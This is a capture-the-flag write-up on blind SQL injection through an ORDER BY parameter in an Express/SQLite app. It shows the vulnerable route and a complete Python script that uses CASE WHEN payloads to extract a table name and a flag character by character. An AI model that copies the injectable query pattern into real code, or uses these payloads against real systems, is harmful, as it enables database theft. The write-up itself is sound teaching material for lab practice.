# Blind SQLi via ORDER BY

The database configures itself with local SQLite3 database. We know that database contains flag table which is random string: 
```js
➜ node
> `flag${Math.random().toString(36).substring(2, 7)}`
'flagyxofc'
```

Vulnerability code:
```js
const express = require("express");
const { db } = require("../db.js");

const router = express.Router();

// Fix this ASAP!
router.get("/anime", (req, res) => {
  const { order } = req.query;

  if (!order) {
    return res.status(400).json({ error: "Order is required!" });
  }

  console.log(`SELECT * FROM anime ORDER BY ${order}`)
  db.all(`SELECT * FROM anime ORDER BY ${order}`, (err, rows) => {
    if (err) {
      return res
        .status(500)
        .json({ error: "Internal Server Error", details: err.message });
    }

    res.status(200).json(rows);
  });
});

module.exports = router;
```

## Solution

```python
import requests
import string

class Payloads:
    BASE = """
    CASE 
        WHEN <INJECTION> 
        THEN id  
        ELSE votes 
    END
    """.strip().replace('    ', '').replace('\n', '')
    TABLES = BASE.replace('<INJECTION>', "(SELECT tbl_name FROM sqlite_master WHERE tbl_name LIKE 'flag%') LIKE '{}%' ")
    FLAG = BASE.replace('<INJECTION>', "SUBSTR((SELECT flag FROM {}),{},1)='{}' ")

class Charsets:
    TABLES = set(string.ascii_lowercase + string.hexdigits.lower() + ',')
    FLAG = string.ascii_lowercase + string.digits + '{}!?,_'

URL = "http://localhost:5000/anime"

table = ""
while True:
    prev = table
    for c in Charsets.TABLES:
        resp = requests.get(URL, params={'order': Payloads.TABLES.format(table+c)}).json()
        print(f'\r{table=} | {c=}', end='')
        if resp[0]['id'] == 1:
            table += c

    if prev == table:
        break

print(f'\n{table=} | {c=}')

i = 1
flag = ''
while True:
    prev = flag
    for c in Charsets.FLAG:
        resp = requests.get(URL, params={'order': Payloads.FLAG.format(table, i, c)}).json()
        print(f'\r{flag=} | {c=}', end='')
        if resp[0]['id'] == 1:
            flag += c
            i += 1
    
    if prev == flag:
        break

print(f'\n{flag=} | {c=}')

# └─$ py brute.py 
# table='flag5avac' | c='u'
# flag='flag{dummy}' | c='_'
```